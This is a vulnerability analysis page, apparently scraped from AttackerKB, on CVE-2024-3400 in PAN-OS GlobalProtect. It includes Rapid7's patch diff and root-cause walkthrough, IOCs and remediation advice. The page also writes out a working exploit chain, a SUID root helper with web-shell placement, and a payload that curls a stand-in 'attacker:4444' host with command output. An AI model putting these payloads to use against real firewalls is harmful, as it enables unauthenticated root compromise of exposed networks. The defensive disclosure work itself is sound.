{"aid": "40061403", "title": "Analysis of OS command injection vulnerability in GlobalProtect Gateway", "url": "https://attackerkb.com/topics/SSTk336Tmf/cve-2024-3400", "domain": "attackerkb.com", "votes": 1, "user": "skilled", "posted_at": "2024-04-17 07:04:56", "comments": 0, "source_title": "CVE-2024-3400 | AttackerKB", "source_text": "CVE-2024-3400 | AttackerKB\n\nAttacker Value\n\n##### Very High\n\n9\n\n### CVE-2024-3400\n\n9\n\n## CVE ID\n\nAttackerKB requires a CVE ID in order to pull vulnerability data and\nreferences from the CVE list and the National Vulnerability Database. If\navailable, please supply below:\n\n## Add References:\n\n##### Advisory\n\nAdd Another\n\n##### Exploit\n\nAdd Another\n\n##### Mitigation\n\nAdd Another\n\n##### Related AttackerKB Topic\n\nAdd Another\n\n##### Miscellaneous\n\nAdd Another\n\nAttacker Value\n\n###### Very High\n\n(2 users assessed)\n\nExploitability\n\n###### High\n\n(2 users assessed)\n\nUser Interaction\n\n###### None\n\nPrivileges Required\n\n###### None\n\nAttack Vector\n\n###### Network\n\n9\n\n# CVE-2024-3400\n\nDisclosure Date: April 12, 2024 \u2022\n\n(Last updated April 17, 2024) \u25be\n\nCVE-2024-3400 CVSS v3 Base Score: 10.0\n\nExploited in the Wild\n\nReported by cbeek-r7 and 3 more... View Source Details\n\nMITRE ATT&CK Log in to add MITRE ATT&CK tag\n\nAdd MITRE ATT&CK tactics and techniques that apply to this CVE.\n\nExecution\n\nTechniques\n\nValidation\n\nValidated\n\nInitial Access\n\nTechniques\n\nValidation\n\nValidated\n\n### MITRE ATT&CK\n\nSelect the MITRE ATT&CK Tactics that apply to this CVE\n\n##### Collection\n\nSelect any Techniques used:\n\n##### Command and Control\n\nSelect any Techniques used:\n\n##### Credential Access\n\nSelect any Techniques used:\n\n##### Defense Evasion\n\nSelect any Techniques used:\n\n##### Discovery\n\nSelect any Techniques used:\n\n##### Execution\n\nSelect any Techniques used:\n\n##### Exfiltration\n\nSelect any Techniques used:\n\n##### Impact\n\nSelect any Techniques used:\n\n##### Initial Access\n\nSelect any Techniques used:\n\n##### Lateral Movement\n\nSelect any Techniques used:\n\n##### Persistence\n\nSelect any Techniques used:\n\n##### Privilege Escalation\n\nSelect any Techniques used:\n\nCISA KEV ListedCommon in enterpriseEasy to weaponizeGives privileged\naccessObserved in nation state sponsored attacksUnauthenticatedVulnerable in\ndefault configuration\n\n### Topic Tags\n\nSelect the tags that apply to this CVE (Assessment added tags are disabled and\ncannot be removed)\n\nWhat makes this of high-value to an attacker?\n\nWhat makes this of low-value to an attacker?\n\n## Description\n\nA command injection vulnerability in the GlobalProtect feature of Palo Alto\nNetworks PAN-OS software for specific PAN-OS versions and distinct feature\nconfigurations may enable an unauthenticated attacker to execute arbitrary\ncode with root privileges on the firewall.\n\nCloud NGFW, Panorama appliances, and Prisma Access are not impacted by this\nvulnerability.\n\nSee More See Less\n\n  * Ratings & Analysis\n  * Vulnerability Details\n  * Analysis\n\n## Add Assessment\n\nLog in to add an Assessment\n\n3\n\nremmons-r7 (4)\n\nApril 16, 2024 9:47pm UTC (10 hours ago)\u2022Edited 1 minute ago\n\n###### Ratings\n\n  * Attacker Value\n\nVery High\n\n  * Exploitability\n\nHigh\n\nCISA KEV ListedCommon in enterpriseEasy to weaponizeGives privileged\naccessObserved in nation state sponsored attacksUnauthenticatedVulnerable in\ndefault configuration\n\n###### Technical Analysis\n\n### Technical Analysis\n\nCVE-2024-3400, which is technically a chain of two vulnerabilities, is an\nunauthenticated remote code execution exploit for software with a broad public\nattack surface. This vulnerability was discovered when it was used by a\nsuspected nation state actor in the wild for initial access; needless to say,\nthis is a bad one. Though some early communication indicated that turning off\ntelemetry or enforcing threat signature detection might prevent exploitation,\npatching PAN-OS is necessary. Remediation of CVE-2024-3400 should be a high\npriority for organizations. When patches are applied, check for the IOCs\noutlined in the official Rapid7 analysis to identify any prior successful\nexploitation.\n\n#### Would you also like to delete your Exploited in the Wild Report?\n\nDelete Assessment Only Delete Assessment and Exploited in the Wild Report\n\nLog in to Add Reply\n\nSee MoreSee Less\n\n1\n\nJH407 (2)\n\nApril 16, 2024 12:47pm UTC (19 hours ago)\u2022\n\nEdited 16 hours ago \u25be\n\n###### Ratings\n\nUnauthenticated\n\n###### Technical Analysis\n\nAn OS command injection vulnerability exists within Palo Alto Global Protect\neffecting the following versions with an overall rating of 10/10:\n\nPAN-OS 11.1 < 11.1.2-h3 PAN-OS 11.0 < 11.0.4-h1 PAN-OS 10.2 < 10.2.7-h8, <\n10.2.8-h3, < 10.2.9-h1\n\nCurrent information known is that this vulnerability also requires that\nGlobalProtect gateway and device telemetry are configured. Mitigating\nexploitation of this vulnerability can be done by disabling telemetry\naccording to the vendor.\n\nAn brief OSINT investigation reveals that POC exploit code of this\nvulnerability does exist in the wild but during my search I only found one\nreference and no other articles covering the root cause of this vulnerability.\nPoc can be found here: https://github.com/h4x0r-dz/CVE-2024-3400?tab=readme-\nov-file credit to w2xim3 for finding this\n\nPlease feel free to correct any inaccurate information. in this post. thank\nyou.\n\n#### Would you also like to delete your Exploited in the Wild Report?\n\nDelete Assessment Only Delete Assessment and Exploited in the Wild Report\n\nLog in to Add Reply\n\nSee More &2 repliesSee Less\n\n1\n\nw2xim3 (9) April 16, 2024 2:37pm UTC (17 hours ago)\n\nThis poc look ligit,\n\nhttps://github.com/h4x0r-dz/CVE-2024-3400?tab=readme-ov-file\n\n1\n\nJH407 (2) April 16, 2024 2:52pm UTC (17 hours ago)\u2022\n\nEdited 16 hours ago \u25be\n\nThanks for the reply.\n\nVendor documentation on this page here:\nhttps://knowledgebase.paloaltonetworks.com/KCSArticleDetail?id=kA10g000000PLXiCAO\nidentifies that /ssl-vpn/hipreportcheck.esp is valid. at least validates the\nlegitimacy of the POC.\n\nVendor also specififed that client HIP may be blocked if URL filtering is\napplied \u201cto outside to outside allow rule.\u201d indicating it might be another\nmitigation for the POC exploit.\n\nAlso included log entries for if URL blocking is enabled. If URL blocking is\napplied as specified above might be able to use these logs to determine if\nattempted exploitation has occurred.\n\n(T1884) 10/04/19 10:04:39:708 Debug(1253): SSL3 alert write:warning:close\nnotify (T1884) 10/04/19 10:04:39:709 Info (4309): SendNReceive() failed.\n(T1884) 10/04/19 10:04:39:709 Debug(4136): Send hip report check failed <<<<\n\n##### CVSS V3 Severity and Metrics\n\nData provided by the National Vulnerability Database (NVD)\n\nBase Score:\n\n10.0 Critical\n\nImpact Score:\n\n6\n\nExploitability Score:\n\n3.9\n\nVector:\n\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\n\nAttack Vector (AV):\n\nNetwork\n\nAttack Complexity (AC):\n\nLow\n\nPrivileges Required (PR):\n\nNone\n\nUser Interaction (UI):\n\nNone\n\nScope (S):\n\nChanged\n\nConfidentiality (C):\n\nHigh\n\nIntegrity (I):\n\nHigh\n\nAvailability (A):\n\nHigh\n\n### General Information\n\nOffensive Application\n\nexploit\n\nUtility Class\n\nrce\n\nPorts\n\nUnknown\n\nOS\n\nUnknown\n\nVulnerable Versions\n\nPAN-OS not down converted\n\nCloud NGFW not down converted\n\nPrisma Access not down converted\n\nPrerequisites\n\nUnknown\n\nDiscovered By\n\nVolexity\n\nPoC Author\n\nUnknown\n\nMetasploit Module\n\nUnknown\n\nReporter\n\nVolexity\n\n### Vendors\n\n  * paloaltonetworks\n\n### Products\n\n  * pan-os 10.2.0,\n  * pan-os 11.0.0,\n  * pan-os 11.1.0\n\n### Exploited in the Wild\n\nReported by:\n\ncbeek-r7 indicated sources as\n\n  * Vendor Advisory (https://security.paloaltonetworks.com/CVE-2024-3400)\n  * Government or Industry Alert (https://x.com/stevenadair/status/1778724526274052445)\n\nReported: April 12, 2024 11:05am UTC (4 days ago) \u2022 Edited 4 days ago\n\n#### Would you like to delete this Exploited in the Wild Report?\n\nYes, delete this report\n\nJH407 indicated source as Vendor Advisory\n(https://security.paloaltonetworks.com/CVE-2024-3400)\n\nReported: April 16, 2024 12:47pm UTC (19 hours ago) \u2022 Edited 16 hours ago\n\n#### Would you like to delete this Exploited in the Wild Report?\n\nYes, delete this report\n\ninokii indicated sources as\n\n  * Government or Industry Alert (https://www.cisa.gov/known-exploited-vulnerabilities-catalogCISA Gov Alert)\n  * Other: CISA Gov Alert (https://www.cisa.gov/news-events/alerts/2024/04/12/cisa-adds-one-known-exploited-vulnerability-catalog)\n\nReported: April 16, 2024 7:46pm UTC (12 hours ago)\n\n#### Would you like to delete this Exploited in the Wild Report?\n\nYes, delete this report\n\nremmons-r7 indicated sources as\n\n  * Vendor Advisory (https://security.paloaltonetworks.com/CVE-2024-3400)\n  * Government or Industry Alert (https://www.cisa.gov/known-exploited-vulnerabilities-catalog)\n  * News Article or Blog (https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/)\n\nReported: April 16, 2024 9:47pm UTC (10 hours ago)\n\n#### Would you like to delete this Exploited in the Wild Report?\n\nYes, delete this report\n\n### References\n\n##### Canonical\n\nCVE-2024-3400 (https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-3400)\n\n##### Miscellaneous\n\nhttps://security.paloaltonetworks.com/CVE-2024-3400\n\nhttps://unit42.paloaltonetworks.com/cve-2024-3400/\n\nhttps://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-\nunauthenticated-remote-code-execution-vulnerability-in-globalprotect-\ncve-2024-3400/\n\n### Additional Info\n\nAuthenticated\n\nUnknown\n\nExploitable\n\nUnknown\n\nReliability\n\nUnknown\n\nStability\n\nUnknown\n\nAvailable Mitigations\n\nUnknown\n\nShelf Life\n\nUnknown\n\nUserbase/Installbase\n\nUnknown\n\nPatch Effectiveness\n\nUnknown\n\nRapid7\n\nApril 16, 2024 7:20pm UTC (12 hours ago)\u2022 Last updated April 17, 2024 12:48am\nUTC (7 hours ago)\n\n###### Technical Analysis\n\n## Overview\n\nOn April 12, 2024, Palo Alto Networks published an advisory for a critical\nunauthenticated command injection vulnerability affecting several recent\nversions of PAN-OS, the software that runs on most modern Palo Alto Networks\nfirewall appliances. According to the vendor advisory, CVE-2024-3400 requires\nthat either GlobalProtect Portal or GlobalProtect Gateway be enabled.\nGlobalProtect is the VPN feature of PAN-OS, and as such the vulnerable\ncomponents are expected to be internet-facing.\n\nNote: The vendor advisory originally indicated that device telemetry needed to\nbe enabled in addition to GlobalProtect Portal or Gateway; as of April 16, the\nadvisory notes that \u201cDevice telemetry does not need to be enabled for PAN-OS\nfirewalls to be exposed to attacks related to this vulnerability.\u201d Disabling\ndevice telemetry is also no longer considered an effective mitigation.\n\nCVE-2024-3400 was discovered by security firm Volexity, which detected in-the-\nwild zero-day exploitation circa April 10, 2024. Both Volexity and Palo Alto\nNetworks have extensive blog posts available with attacker behavior\nobservations and indicators of compromise (IOCs).\n\nRapid7\u2019s analysis of this vulnerability has identified that the exploit is in\nfact an exploit chain, consisting of two distinct vulnerabilities: an\narbitrary file creation vulnerability in the GlobalProtect web server, for\nwhich no discrete CVE has been assigned, and a command injection vulnerability\nin the device telemetry feature, designated as CVE-2024-3400. If device\ntelemetry is disabled, it is still possible to leverage the file creation\nvulnerability; at time of writing, however, Rapid7 has not identified an\nalternative way to leverage the file creation vulnerability for successful\nexploitation.\n\nOur analysis also found that when device telemetry is enabled, a device\ncertificate must be installed for device telemetry to successfully transmit\ntelemetry data back to Palo Alto Networks. This transmission of data\nfunctionality is where the command injection vulnerability lies, and in our\ntesting, the command injection vulnerability could not be triggered without a\nvalid device certificate installed. We observed that transmission of telemetry\ndata only occurs once an hour, per the vendor documentation.\n\nThis analysis detailed our findings using PAN-OS version 10.2.9, with\nGlobalProtect Portal, GlobalProtect Gateway, and device telemetry all enabled.\n\n## Analysis\n\n### Rooting the Device\n\nOut of the box, PAN-OS implements a limited command-line administrator\nmanagement shell for console and SSH. In order to perform comprehensive\ndynamic testing, we want root access to the device. Boot-time integrity checks\nare performed for many parts of the file system, preventing common easy\nbackdoor tactics like modification of /etc/passwd. However, the /var directory\nisn\u2019t checked for integrity on boot, which we\u2019ll use to our advantage.\n\nSince /var/appweb/htdocs contains the primary PHP web server files, it can be\ntampered with and leveraged for code execution as the nobody user. We\u2019ll mount\nthe VMDK virtual machine disk to an Ubuntu system and drop a web shell in the\n/var/appweb/htdocs/unauth/php directory. Furthermore, because root-level code\nexecution is the goal, we also compile and place a statically linked SUID\nbinary called root in the same directory:\n\n    \n    \n    #include <stdio.h> #include <stdlib.h> #include <unistd.h> // Compile with /usr/bin/x86_64-linux-musl-gcc -static -o root root.c int main (int argc, char *argv[]) { if (argc < 2) { fprintf(stdout, \"usage: %s command\\n\", argv[0]); return 1; } setuid(0); setgid(0); setgroups(0, NULL); execl(\"/bin/sh\", \"sh\", \"-c\", argv[1], (char *)NULL); perror(\"execl failed\"); return EXIT_FAILURE; }\n\nThen:\n\nsudo chown root:root ./root && sudo chmod 4755 ./root\n\nStarting the Palo Alto Networks VM and browsing to\nhttps://hostname/unauth/php/backdoor.php yields our web shell, which can be\nused to execute commands as root.\n\nWe\u2019ll execute ./root 'sed -i -e\ns@/opt/pancfg/home/admin:/usr/local/bin/cli@/opt/pancfg/home/admin:/bin/bash@g\n/etc/passwd' and snapshot the virtual machine to skip start-up integrity\nchecks. Lastly, we authenticate the machine via SSH to confirm our regular\nshell is working.\n\n### Diffing the Patch\n\nAfter installing a vulnerable PAN-OS 10.2.9 in a VM and taking a snapshot, we\nupdated our VM to the patched version 10.2.9-h1 and took another snapshot. By\nusing the hard disk images from these snapshots we had access to the\nunderlying hard disk images for each version. Each hard disk contains several\npartitions. The partition sysroot0 contains the file system contents we want\nto analyze.\n\nSince we know that either GlobalProtect Portal or GlobalProtect Gateway is\nrequired for exploitation, we locate the GlobalProtect service binary\n/usr/local/bin/gpsvc. This binary services the HTTP requests for both the\nPortal and Gateway via an NGINX front end that proxies incoming requests to\nthis internal service. The NGINX configuration can be found in\n/etc/nginx/sslvpm/location.conf.\n\nThe gpsvc is written in Go, and we can diff the vulnerable and patched version\nusing a tool like BinDiff. Doing so quickly reveals a small change to the\nservice.\n\nThe patched version of gpsvc adds a single function main_isValidSessionId.\nThis function is used to ensure a session ID value (provided by an incoming\nHTTP request) is a valid UUID value, as shown below:\n\n    \n    \n    // main.isValidSessionId bool __golang main_isValidSessionId(string sessionId) { return (unsigned __int64)github_com_google_uuid_Parse(sessionId)._r2.tab == 0; }\n\nThe main_isValidSessionId function is called by main__ptr_SessDiskStore_New\nand will extract an HTTP request\u2019s session ID value from the SESSID HTTP\ncookie. It will then verify that the session ID value is a UUID before either\ncreating a new session file on disk using the value, or loading an existing\nsession from disk if one already exists. If the session ID is not a UUID\nvalue, an \u201cinvalid session id\u201d message is logged. We can therefore speculate\nthat in a vulnerable version of PAN-OS, an attacker-controlled session ID can\ncontain arbitrary values that are not a valid UUID and that these may be\nwritten to disk when creating a new session for the incoming request.\n\nAs we still have not identified the command injection vulnerability, we locate\nthe programs that perform the device telemetry feature. These include:\n\n  * /usr/local/bin/devicetelemetry\n  * /usr/local/bin/telemetry_collection.py\n  * /etc/device_telemetry/cfg_telem.yaml\n  * /usr/local/bin/dt_send\n  * /usr/local/bin/dt_curl\n\nWe identify dt_curl as containing several modifications, which clearly show\ntwo locations that have been modified to prevent command injection from\noccurring.\n\n    \n    \n    --- a/10.2.9_dt_curl +++ b/10.2.9_h1_dt_curl @@ -431,26 +431,28 @@ def get_key(logger, dbg, ip, fname, \\ content_type_str = \" -H \\\"Content-Type: application/json\\\"\" # with stg5 cdl rx, port is not required #api_endpoint_str = \"'https://%s:8443/upload/start'\" %ip - api_endpoint_str = \"'https://%s/upload/start'\" %ip + api_endpoint_str = \"https://%s/upload/start\" %ip # Note: in the latest stage5 cdl setup, cert type is not required. Set it to empty if cert_type.lower() != CLIENT_CERT_TYPE_P12.lower(): cert_type_str = \"\" - curl_cmd_fmt = None source_ip_str = get_source_ip(logger,dbg) if source_ip_str is not None and source_ip_str != \"\": - curl_cmd_fmt = \"/usr/bin/curl -v %s %s --interface %s\" %(cert_type_str, cert_file_str,source_ip_str) + payload = '{\"fileName\":\"' + fname + '\",\"schema\":\"telemetry.raw\"}' + curl_list = ['/usr/bin/curl', '-v', '--key', f\"{client_key}\", '--cert', f\"{cert_file}\", '--capath', f\"{capath}\", '-H', + 'Content-Type: application/json', '--interface', f\"{source_ip_str}\", '-X', 'POST', + f\"{api_endpoint_str}\", \"-d\", f\"{payload}\"] else: - curl_cmd_fmt = \"/usr/bin/curl -v %s %s\" %(cert_type_str, cert_file_str) + payload = '{\"fileName\":\"' + fname + '\",\"schema\":\"telemetry.raw\"}' + curl_list = ['/usr/bin/curl', '-v', '--key', f\"{client_key}\", '--cert', f\"{cert_file}\", '--capath', f\"{capath}\", '-H', + 'Content-Type: application/json', '-X', 'POST', f\"{api_endpoint_str}\", \"-d\", f\"{payload}\"] if dbg: - logger.info(\"S1: KEY: CDL: curl cmd format: %s\" %curl_cmd_fmt) - curl_cmd = \"%s -H \\\"Content-Type: application/json\\\" -X POST %s -d'{ \\\"fileName\\\": \\\"%s\\\", \\\"schema\\\": \\\"telemetry.raw\\\"}'\" \\ - %(curl_cmd_fmt, api_endpoint_str, fname) - if dbg: - logger.info(\"S1: KEY: CDL curl cmd: %s\" %curl_cmd) - stat, rsp, err, pid = pansys(curl_cmd, shell=True, timeout=250) + logger.info(\"S1: KEY: CDL curl cmd: %s\" %repr(curl_list)) + logger.info(\"S1: KEY: CDL curl cmd: %s\" % \" \".join(curl_list)) + + stat, rsp, err, pid = pansys(curl_list, shell=False, timeout=250) if dbg: logger.info(\"S1: CDL: RSP KEY STAT: %s\" %stat) logger.info(\"S1: CDL: RSP KEY RESPONSE: %s\" %rsp) @@ -512,14 +514,14 @@ def get_key(logger, dbg, ip, fname, \\ def send_file(logger, dbg, fname, dest_ip, key, signedUrl, capath): source_ip_str = get_source_ip(logger,dbg) if source_ip_str is not None and source_ip_str != \"\": - curl_cmd = \"/usr/bin/curl -v -H \\\"Content-Type: application/octet-stream\\\" -X PUT \\\"%s\\\" --data-binary @%s --capath %s --interface %s\" \\ - %(signedUrl, fname, capath, source_ip_str) + curl_list = ['/usr/bin/curl', '-v', '-H', 'Content-Type: application/octet-stream', '-X', 'PUT', f\"{signedUrl}\", '--data-binary', f\"@{fname}\", '--capath', f\"{capath}\", '--interface', f\"{source_ip_str}\"] else: - curl_cmd = \"/usr/bin/curl -v -H \\\"Content-Type: application/octet-stream\\\" -X PUT \\\"%s\\\" --data-binary @%s --capath %s\" \\ - %(signedUrl, fname, capath) + curl_list = ['/usr/bin/curl', '-v', '-H', 'Content-Type: application/octet-stream', '-X', 'PUT', f\"{signedUrl}\", '--data-binary', f\"@{fname}\", '--capath', f\"{capath}\"] + if dbg: - logger.info(\"S2: XFILE: send_file: curl cmd: '%s'\" %curl_cmd) - stat, rsp, err, pid = pansys(curl_cmd, shell=True, timeout=250) + logger.info(\"S2: XFILE: send_file: curl_list: '%s'\" %repr(curl_list)) + logger.info(\"S2: XFILE: send_file: curl cmd: '%s'\" % \" \".join(curl_list)) + stat, rsp, err, pid = pansys(curl_list, shell=False, timeout=250) if dbg: logger.info(\"S2: send_file: RSP STAT: %s\" %stat)\n\nWe can see from the diff of the send_file function above that a command string\nis constructed to execute the cURL binary in order to upload a file to a\nserver, and this command string is passed to the pansys function to execute\nthe command. We can also see from the diff that the shell parameter to pansys\nhas been changed from True to False.\n\nExamining the vulnerable version of the send_file function in isolation, we\ncan see how it works below:\n\n    \n    \n    def send_file(logger, dbg, fname, dest_ip, key, signedUrl, capath): source_ip_str = get_source_ip(logger,dbg) if source_ip_str is not None and source_ip_str != \"\": curl_cmd = \"/usr/bin/curl -v -H \\\"Content-Type: application/octet-stream\\\" -X PUT \\\"%s\\\" --data-binary @%s --capath %s --interface %s\" \\ %(signedUrl, fname, capath, source_ip_str) else: curl_cmd = \"/usr/bin/curl -v -H \\\"Content-Type: application/octet-stream\\\" -X PUT \\\"%s\\\" --data-binary @%s --capath %s\" \\ %(signedUrl, fname, capath) if dbg: logger.info(\"S2: XFILE: send_file: curl cmd: '%s'\" %curl_cmd) stat, rsp, err, pid = pansys(curl_cmd, shell=True, timeout=250)\n\nIt is likely that an attacker-controlled file name passed in the fname\nvariable can be used to perform command injection when the curl_cmd string is\nexecuted via pansys.\n\nThe function pansys is from a library function pansys.pansys().dosys located\nin /usr/lib64/python3.6/site-packages/pansys/pansys.py and has the following\ncode:\n\n    \n    \n    def dosys(self, command, close_fds=True, shell=False, timeout=30, first_wait=None): \"\"\"call shell-command and either return its output or kill it if it doesn't normally exit within timeout seconds\"\"\" # Define dosys specific constants here PANSYS_POST_SIGKILL_RETRY_COUNT = 5 # how long to pause between poll-readline-readline cycles PANSYS_DOSYS_PAUSE = 0.1 # Use first_wait if time to complete is lengthy and can be estimated if first_wait == None: first_wait = PANSYS_DOSYS_PAUSE # restrict the maximum possible dosys timeout PANSYS_DOSYS_MAX_TIMEOUT = 23 * 60 * 60 # Can support upto 2GB per stream out = StringIO() err = StringIO() try: if shell: cmd = command else: cmd = command.split() except AttributeError: cmd = command p = subprocess.Popen(cmd, stdout=subprocess.PIPE, bufsize=1, shell=shell, stderr=subprocess.PIPE, close_fds=close_fds, universal_newlines=True)\n\nWe can see the command string is executed via subprocess.Popen and the shell\nparameter, when passed in by the vulnerable version of dt_send, will be True.\nThis is unsafe, as the command string will be executed in the context of a\nLinux shell, and as such will have access to shell features, such as\nbackticks, pipes, redirects, and so on \u2014 perfect for executing an attacker-\ncontrolled input.\n\n### Arbitrary File Creation\n\nThe gpsvc GlobalProtect application serves an HTTPS service on port 443.\n\nThe web server sets a SESSID cookie for unauthenticated sessions, and the data\naffiliated with the session cookie is placed in /tmp/sslvpn.\n\nSince the cookie data is appended to the session_ string, we\u2019ll try sending\ndifferent data within the SESSID cookie:\n\ncurl https://hostname/global-protect/login.esp -k -H 'Cookie:\nSESSID=test_data'\n\nChecking the session directory confirms that our data was written!\n\n    \n    \n    $ ls -lha /tmp/sslvpn/session_test_data -rw------- 1 root root 0 Apr 15 12:50 session_test_data\n\nA quick test shows that the session_ prefix can be avoided altogether by\nprepending a traversal sequence, resulting in an arbitrary empty file write.\nThe request type can be GET or POST, just so long as it\u2019s a properly\nstructured HTTPS request to a valid endpoint.\n\ncurl https://hostname/global-protect/login.esp -k -H 'Cookie:\nSESSID=./../../../hello_as_root'\n\n    \n    \n    $ ls -lha /hello_as_root -rw------- 1 root root 0 Apr 15 12:55 hello_as_root\n\n### Command Injection Exploitation\n\nAt this point, we\u2019ve established some strong primitives. We have the ability\nto create arbitrarily named empty files anywhere on the file system as root.\nSince we\u2019ve also determined that the telemetry service is vulnerable to\ncommand injection via the file name parameter, we can begin to put the pieces\ntogether. The telemetry service runs routinely, via the cron job located in\n/etc/cron.d/device_telemetry_send. The script /usr/local/bin/dt_send will\ncrawl the /opt/panlogs/tmp/device_telemetry/hour and\n/opt/panlogs/tmp/device_telemetry/day directories for new files, then include\nthe file names in a cURL request every hour, via the /usr/local/bin/dt_curl\nscript.\n\nNotably, we did not observe payloads placed in\n/opt/panlogs/tmp/device_telemetry/minute executing on our vulnerable 10.2.9\ntest instances. Based on Palo Alto Networks\u2019s documentation, it appears that\nPAN-OS may transmit telemetry differently across affected versions, so payload\nplacement requirements and execution timelines may vary.\n\nTo trigger remote code execution, we perform an unauthenticated cURL request\nto the GlobalProtect web server with a crafted payload in the SESSID cookie\nvalue. When the server executes its telemetry transmission process once per\nhour, the payload will be executed and removed from the telemetry directory.\n\n    \n    \n    curl https://hostname/global-protect/login.esp -k -H 'Cookie: SESSID=./../../../opt/panlogs/tmp/device_telemetry/hour/aaa`curl${IFS}attacker:4444?user=$(whoami)`'\n\nAfter a short wait, we can establish remote code execution:\n\n    \n    \n    $ ps auxfw [..] /usr/bin/python -t /usr/local/bin/dt_curl -i 35.184.126.116 -f /opt/panlogs/tmp/device_telemetry/hour/aaa`curl${IFS}attacker:4444?user=$(whoami)`'\n\nOn the attacker machine, a Python web server receives a GET request that\nindicates our code was executed with root privileges.\n\n    \n    \n    python3 -m http.server 4444 Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ... 192.168.50.226 - - [15/Apr/2024 19:00:17] \"GET /?user=root HTTP/1.1\" 200 -\n\n## IOCs\n\nSuccessful exploitation may leave artifacts in several folders and log files\nused by PAN-OS.\n\nThe NGINX frontend web server, which proxies requests to the GlobalProtect\nservice, will log all HTTP requests to /var/log/nginx/sslvpn_access.log. While\nwe will not be able to see the HTTP POST data with the malicious SESSID\ncookies, we can view the requests the server has processed and the associated\nclient IP address. Note the SESSID cookie can be passed via other HTTP\nmethods, such as GET.\n\n    \n    \n    192.168.86.34 51232 - 192.168.86.20 20077 [16/Apr/2024:02:53:31 -0700] \"POST /global-protect/logout.esp HTTP/1.1\" 200 4406 \"-\" \"curl/8.4.0\" 1713261211.617 0.002 0.002 987 127.0.0.1 57108 - 127.0.0.1 20077 [16/Apr/2024:02:54:03 -0700] \"GET /sslvpn_ngx_status HTTP/1.1\" 200 103 \"-\" \"Wget/1.19.5 (linux-gnu)\" 1713261243.774 0.000 - 989 192.168.86.34 51275 - 192.168.86.20 20077 [16/Apr/2024:02:54:24 -0700] \"POST /global-protect/login.esp HTTP/1.1\" 200 11364 \"-\" \"curl/8.4.0\" 1713261264.522 0.002 0.002 991\n\nSimilarly, the log file /var/log/pan/sslvpn-access/sslvpn-access.log will also\ncontain a log of the HTTP requests, as shown below:\n\n    \n    \n    192.168.86.34 [2024-04-16 02:53:31.616147783 -0700 PDT] POST /global-protect/logout.esp HTTP/1.1 0 200 4406, taskid 37 [rate] http request rate is 0.1/s in last 10 seconds 192.168.86.34 [2024-04-16 02:54:24.521150674 -0700 PDT] POST /global-protect/login.esp HTTP/1.1 0 200 11364, taskid 38 [rate] http request rate is 0.1/s in last 10 seconds\n\nWhen targeting device telemetry for command injection, the attacker will place\na 0 length file in one of the subfolders in\n/opt/panlogs/tmp/device_telemetry/, such as\n/opt/panlogs/tmp/device_telemetry/hour/ or\n/opt/panlogs/tmp/device_telemetry/day/. This file name will include characters\nsuitable for command injection. The contents of this folder, and the sub-\nfolders, should be reviewed for suspicious 0 length files.\n\nThe log file /var/log/pan/device_telemetry_send.log will show the command\nbeing injected:\n\n    \n    \n    2024-04-16 10:03:03,628 dt_send INFO TX_DIR: send file dir: /opt/panlogs/tmp/device_telemetry/day/, n_files: 1 2024-04-16 10:03:03,628 dt_send INFO sorted file list: tmp_dir: /opt/panlogs/tmp/device_telemetry/day/* 2024-04-16 10:03:03,629 dt_send INFO TX_DIR: send file dir: fname: /opt/panlogs/tmp/device_telemetry/day/aaa`curl${IFS}attacker:4444?user=$(whoami)` 2024-04-16 10:03:03,629 dt_send INFO TX FILE: send_fname: /opt/panlogs/tmp/device_telemetry/day/aaa`curl${IFS}attacker:4444?user=$(whoami)` 2024-04-16 10:03:03,630 dt_send INFO TX_FILE: dest server ip: 35.184.126.116 2024-04-16 10:03:03,630 dt_send INFO TX FILE: send_file_cmd: /usr/local/bin/dt_curl -i 35.184.126.116 -f /opt/panlogs/tmp/device_telemetry/day/aaa`curl${IFS}attacker:4444?user=$(whoami)` 2024-04-16 10:05:21,152 dt_send INFO TX FILE: curl cmd status: 24, 24; err msg: 'DNS lookup failed'\n\n## Remediation\n\nThe following versions of PAN-OS are listed as vulnerable as of April 16,\n2024. Notably, Palo Alto Networks has updated the advisory with additional\nvulnerable versions since releasing the original advisory on CVE-2024-3400.\n\n  * PAN-OS 11.1 (before 11.1.2-h3)\n  * PAN-OS 11.0 (before 11.0.4-h1)\n  * PAN-OS 10.2 (before 10.2.7-h8, before 10.2.8-h3, before 10.2.9-h1)\n  * Additional versions have been added to the advisory since initial publication\n\nPatches are available from the vendor and should be applied on an urgent\nbasis. If you are unable to apply patches, Rapid7 strongly recommends applying\none of the vendor-supplied mitigations on an emergency basis. Please see the\nvendor advisory for further information.\n\n## References\n\n  * Rapid7 blog\n  * Palo Alto Networks advisory\n  * Palo Alto Networks Unit 42 blog\n  * Volexity blog\n\n# Report as Exploited in the Wild\n\n## CVE ID\n\nAttackerKB requires a CVE ID in order to pull vulnerability data and\nreferences from the CVE list and the National Vulnerability Database. If\navailable, please supply below:\n\n## Add References:\n\n## Quick Cookie Notification\n\nThis site uses cookies for anonymized analytics to improve the site.\n\nRapid7 will never sell the data collected on this site.\n\nView our Cookie Policy for full details\n\nThis site uses cookies for anonymized analytics. For more information or to\nchange your cookie settings, view our Cookie Policy.\n\nTerms of Use Code of Conduct FAQ Changelog Privacy Policy Contact API A Rapid7\nProject\n\n### Watch This Topic\n\nWatch this topic to be notified when new information, assessments, and\ncomments are added\n\n", "frontpage": false}
